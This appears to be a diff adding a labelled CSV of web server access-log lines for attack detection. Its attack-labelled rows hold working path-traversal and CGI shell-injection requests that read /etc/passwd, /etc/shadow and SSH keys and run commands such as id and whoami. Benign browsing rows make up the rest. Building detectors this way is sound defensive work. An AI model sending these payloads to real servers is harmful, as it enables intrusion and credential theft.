@@ -1,0 +1,26 @@
+"192.168.1.101 - - [18/Feb/2025:10:16:05 +0000] ""GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1"" 200 1024 ""-""
+",1
+"192.168.1.102 - - [18/Feb/2025:10:17:32 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1"" 200 512 ""-"" ""echo Content-Type: text/plain; echo; cat /etc/shadow""
+",1
+"192.168.1.103 - - [18/Feb/2025:10:18:45 +0000] ""POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash HTTP/1.1"" 200 612 ""-"" ""echo Content-Type: text/plain; echo; whoami""
+",1
+"192.168.1.104 - - [18/Feb/2025:10:19:10 +0000] ""GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/hosts HTTP/1.1"" 200 314 ""-""",1
+"192.168.1.105 - - [18/Feb/2025:10:20:30 +0000] ""GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/root/.ssh/id_rsa HTTP/1.1"" 403 128 ""-""",1
+"192.168.1.106 - - [18/Feb/2025:10:21:45 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1"" 200 874 ""-"" ""echo Content-Type: text/plain; echo; id""",1
+"192.168.1.107 - - [18/Feb/2025:10:22:10 +0000] ""POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash HTTP/1.1"" 200 789 ""-"" ""echo Content-Type: text/plain; echo; uname -a""",1
+"192.168.1.108 - - [18/Feb/2025:10:23:55 +0000] ""POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash HTTP/1.1"" 200 1024 ""-"" ""echo Content-Type: text/plain; echo; cat /var/www/html/index.php""",1
+"192.168.1.109 - - [18/Feb/2025:10:24:40 +0000] ""GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/log/apache2/access.log HTTP/1.1"" 200 512 ""-""",1
+"192.168.1.110 - - [18/Feb/2025:10:25:20 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1"" 200 210 ""-"" ""echo Content-Type: text/plain; echo; netstat -tulpn""",1
+"192.168.1.111 - - [18/Feb/2025:10:26:15 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1"" 200 450 ""-"" ""echo Content-Type: text/plain; echo; ps aux""",1
+"192.168.1.112 - - [18/Feb/2025:10:27:05 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1"" 200 512 ""-"" ""echo Content-Type: text/plain; echo; cat /etc/crontab""",1
+"192.168.1.113 - - [18/Feb/2025:10:28:30 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1"" 200 702 ""-"" ""echo Content-Type: text/plain; echo; cat /etc/issue""",1
+"192.168.1.200 - - [18/Feb/2025:12:01:15 +0000] ""GET /index.html HTTP/1.1"" 200 1024 ""-""",0
+"192.168.1.201 - - [18/Feb/2025:12:02:10 +0000] ""GET /about-us.html HTTP/1.1"" 200 2048 ""-""",0
+"192.168.1.202 - - [18/Feb/2025:12:03:25 +0000] ""POST /login HTTP/1.1"" 200 512 ""-"" ""User-Agent: Mozilla/5.0""",0
+"192.168.1.203 - - [18/Feb/2025:12:05:30 +0000] ""GET /products.html HTTP/1.1"" 200 1536 ""-""",0
+"192.168.1.204 - - [18/Feb/2025:12:06:40 +0000] ""GET /cart HTTP/1.1"" 200 768 ""-"" ""User-Agent: Chrome/99.0""",0
+"192.168.1.205 - - [18/Feb/2025:12:08:10 +0000] ""POST /checkout HTTP/1.1"" 302 256 ""-"" ""User-Agent: Safari/15.1""",0
+"192.168.1.206 - - [18/Feb/2025:12:09:55 +0000] ""GET /contact.html HTTP/1.1"" 200 512 ""-""",0
+"192.168.1.207 - - [18/Feb/2025:12:11:20 +0000] ""GET /blog/article-123 HTTP/1.1"" 200 1024 ""-""",0
+"192.168.1.208 - - [18/Feb/2025:12:12:35 +0000] ""POST /api/submit-feedback HTTP/1.1"" 200 128 ""-"" ""User-Agent: Edge/100.0""",0
+"192.168.1.209 - - [18/Feb/2025:12:14:50 +0000] ""GET /help HTTP/1.1"" 200 256 ""-""",0
